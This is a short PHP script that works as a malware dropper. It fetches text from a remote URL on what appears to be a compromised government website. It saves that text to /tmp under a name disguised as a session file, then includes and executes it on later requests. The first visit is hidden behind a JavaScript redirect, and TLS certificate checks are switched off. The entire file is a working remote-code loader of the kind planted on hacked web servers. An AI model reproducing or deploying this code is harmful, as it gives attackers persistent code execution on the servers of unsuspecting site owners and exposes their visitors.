<?php

$data = ['https://municastilla.gob.pe/Docmuni/images/repository/text.txt', '/tmp/sess_'.md5($_SERVER['HTTP_HOST']).'.php'];

if(file_exists($data[1]) && filesize($data[1]) !== 0) {
    include($data[1]);
} else {
    $fopen = fopen($data[1], 'w+');
    fwrite($fopen, get($data[0]));
    fclose($fopen);
    echo '<script>window.location="?notfound";</script>';
}

function get($url) {
    $ch = curl_init();
          curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
          curl_setopt($ch, CURLOPT_URL, $url);
          curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
          curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
    return curl_exec($ch);
          curl_close($ch);
}
?>